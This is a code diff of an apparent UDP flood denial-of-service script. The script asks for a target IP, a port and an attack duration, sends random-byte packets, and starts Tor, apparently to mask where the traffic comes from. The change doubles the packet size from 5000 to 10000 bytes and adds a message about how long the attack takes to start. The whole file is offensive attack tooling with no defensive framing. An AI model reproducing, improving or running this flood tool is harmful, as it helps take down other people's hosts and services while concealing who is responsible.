@@ -69,7 +69,7 @@ LB = '\033[1;36m'
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-packets = random._urandom(5000)
+packets = random._urandom(10000)
 os.system("""
 echo '''
 ███████╗ █████╗ ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
@@ -90,6 +90,7 @@ print                   ip
 os.system('''echo "╚══ host ip ══╝ " | lolcat''')
 port = input(G+'[?] \033[0m3NTER P0RT : ')
 os.system('''echo "how long would you like to attack" | lolcat''')
+os.system('''echo "keep in mind starting the attack takes 4 seconds so set it over that" | lolcat''')
 duration = input(G+'$ ')
 timeout = time.time() + duration
 os.system("service tor start")
